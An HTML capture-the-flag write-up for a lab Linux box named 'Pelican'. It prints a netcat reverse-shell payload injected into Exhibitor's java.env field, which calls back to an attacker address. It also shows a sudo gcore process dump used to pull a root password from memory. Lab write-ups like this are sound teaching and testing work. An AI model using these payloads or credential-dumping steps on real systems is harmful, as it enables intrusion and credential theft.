@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pelican &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Pelican</h1>
+    <div class="meta">Target: <code>192.168.180.98</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Exhibitor</span><span class="tag">ZooKeeper</span><span class="tag">CommandInjection</span><span class="tag">gcore</span><span class="tag">ProcessDump</span><span class="tag">CredentialRecovery</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#exhibitor-zookeeper-command-injection">Exhibitor ZooKeeper Command Injection</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#sudo-gcore-to-dump-the-password-store-process">sudo gcore to Dump the password-store Process</a><a class="lvl3" href="#switching-to-root">Switching to Root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Pelican is a Linux box where the foothold is a command injection vulnerability in Exhibitor for ZooKeeper's web UI, and the privilege escalation involves dumping the memory of a privileged process using <code>gcore</code>, a legitimate debugging tool that the current user can run as root via sudo. The password for root surfaces in plaintext inside the memory dump.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian
+631/tcp  open  ipp         CUPS 2.2
+2222/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2
+8080/tcp open  http        Jetty 1.0
+8081/tcp open  http        nginx 1.14.2
+</code></pre>
+<p>Browsing port 8081 triggers a redirect:</p>
+<pre><code>http://192.168.180.98:8080/exhibitor/v1/ui/index.html
+</code></pre>
+<blockquote>
+<p><strong>What Exhibitor is:</strong> Exhibitor is a web-based management UI for Apache ZooKeeper. It provides configuration management including a <code>java.env script</code> field that gets evaluated by the ZooKeeper process. Passing shell metacharacters into this field causes command execution.</p>
+</blockquote>
+<p>The vulnerability is documented at:
+https://talosintelligence.com/vulnerability_reports/TALOS-2019-0790</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="exhibitor-zookeeper-command-injection">Exhibitor ZooKeeper Command Injection</h3>
+<p>The exploit requires no credentials. In the Exhibitor web UI:</p>
+<ol>
+<li>Click the <strong>Config</strong> tab</li>
+<li>Flip <strong>Editing</strong> to ON</li>
+<li>In the <strong>java.env script</strong> field, enter a command wrapped in <code>$()</code> or backticks</li>
+</ol>
+<p>Payload added to the java.env script field:</p>
+<pre><code class="language-sh">$(/bin/nc -e /bin/sh 192.168.45.244 8081 &amp;)
+</code></pre>
+<p>Click <strong>Commit &gt; All At Once &gt; OK</strong>. The shell arrives within a minute as user <code>charles</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 8081
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.98] 43810
+whoami
+charles
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">script /dev/null -c /bin/bash
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-gcore-to-dump-the-password-store-process">sudo gcore to Dump the password-store Process</h3>
+<p>Checking sudo permissions:</p>
+<pre><code class="language-sh">sudo -l
+User charles may run the following commands on pelican:
+    (ALL) NOPASSWD: /usr/bin/gcore
+</code></pre>
+<p><code>gcore</code> creates a core dump of any running process. Finding a privileged process worth dumping:</p>
+<pre><code class="language-sh">ps aux | grep root
+root   484  0.0  0.0   2276    72 ?   Ss   16:50   0:00 /usr/bin/password-store
+</code></pre>
+<blockquote>
+<p><strong>Why dumping <code>password-store</code> works:</strong> A password manager process has to hold its secrets in memory to operate. Core dumps capture the full memory image of a process at a point in time, including any strings it was currently working with. The OS permission model normally prevents unprivileged users from dumping privileged processes, but sudo on <code>gcore</code> bypasses that entirely.</p>
+</blockquote>
+<p>Dump the process:</p>
+<pre><code class="language-sh">sudo gcore -o output 493
+</code></pre>
+<p>Extract readable strings from the dump:</p>
+<pre><code class="language-sh">strings output.484
+</code></pre>
+<p>Root credentials surface in plaintext:</p>
+<pre><code class="language-sh">001 Password: root:
+‹redacted›
+</code></pre>
+<h3 id="switching-to-root">Switching to Root</h3>
+<pre><code class="language-sh">charles@pelican:/opt/zookeeper$ su root
+Password: ‹redacted›
+
+root@pelican:/opt/zookeeper# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@pelican:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Web-facing configuration UIs are often the whole foothold.</strong> Exhibitor's <code>java.env script</code> field is essentially a root-level shell through a form input, no CVE number required once you know the functionality exists.</li>
+<li><strong><code>sudo -l</code> is the first thing to run after foothold.</strong> The privilege of running <code>gcore</code> as root looks innocuous until you know what a process dump contains.</li>
+<li><strong>Process memory holds secrets in plaintext.</strong> Password managers, databases, and authentication daemons all hold credentials in working memory. If you can dump a process, you can read what it was holding.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
